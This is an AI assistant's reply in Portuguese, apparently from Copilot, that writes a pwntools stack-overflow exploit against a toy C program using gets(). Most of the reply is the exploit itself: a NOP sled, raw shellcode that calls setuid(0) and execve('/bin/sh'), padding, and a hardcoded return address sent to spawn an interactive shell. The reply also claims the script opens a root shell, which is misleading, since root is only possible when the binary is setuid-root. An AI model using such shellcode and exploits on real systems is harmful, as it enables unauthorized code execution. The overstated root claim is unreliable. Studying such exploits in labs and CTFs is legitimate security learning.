Claro! Vou te ajudar a criar um exploit funcional para explorar uma vulnerabilidade de *stack overflow* usando Python e o módulo **pwntools**. Primeiro, vamos entender o contexto:

1. Você tem um binário C simples (chamado `example.c`) que possui uma função vulnerável chamada `vuln_func()`.
2. O código da função `vuln_func()` é o seguinte:
    ```c
    #include <stdio.h>
    #include <string.h>

    void vuln_func() {
        char buffer[256];
        gets(buffer);
    }
    ```
3. O objetivo é criar um payload que cause um *buffer overflow* e execute um shellcode.

Aqui está um exemplo de exploit usando o **pwntools**:

```python
from pwn import *

# Configurações iniciais
bin_path = "./example"
elf = ELF(bin_path)
rop = ROP(elf)
io = process(bin_path)

# Construindo o payload
nopsled = b"\x90" * 100
shellcode = b"\x31\xdb\x89\xd8\xb0\x17\xcd\x80\x48\x31\xc0\x48\x89\xc2\x48\x89\xd6\x50\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x48\x89\xe7\x48\x83\xc0\x3b\x0f\x05"
padding = b"A" * (256 - len(shellcode) - len(nopsled))
padding += b"B" * 8
padding += p64(0x7fffffffdec4)  # Endereço de retorno (ajuste conforme necessário)

payload = nopsled + shellcode + padding

# Enviando o payload
io.recv()
io.sendline(payload)
io.interactive()
```

Lembre-se de ajustar o endereço de retorno (`p64(0x7fffffffdec4)`) para corresponder ao seu ambiente específico. Além disso, certifique-se de que o binário `example` esteja no mesmo diretório em que você está executando o script.

Esse exploit cria um shellcode que executa `/bin/sh` e injeta o payload no programa `example`. Quando você executa o script, ele deve abrir um shell com privilégios de root.

Se você tiver alguma dúvida ou precisar de mais ajuda, fique à vontade para perguntar! 😊¹²³⁴⁵

Fonte: conversa com o Copilot, 30/07/2024
(1) Buffer overflow exploit only working using pwntools. https://stackoverflow.com/questions/64945916/buffer-overflow-exploit-only-working-using-pwntools.
(2) Trying to write a pwntools exploit to buffer-overflow a binary. https://stackoverflow.com/questions/78437370/trying-to-write-a-pwntools-exploit-to-buffer-overflow-a-binary.
(3) exploit - How can I get a corefile for a PE in Python ... - Stack Overflow. https://stackoverflow.com/questions/69559640/how-can-i-get-a-corefile-for-a-pe-in-python-like-i-can-with-pwntools-for-an-elf.
(4) Tut03-2: Writing Exploits with Pwntools - gatech.edu. https://tc.gtisc.gatech.edu/cs6265/2021/tut/tut03-02-pwntools.html.
(5) pwntools · PyPI. https://pypi.org/project/pwntools/.
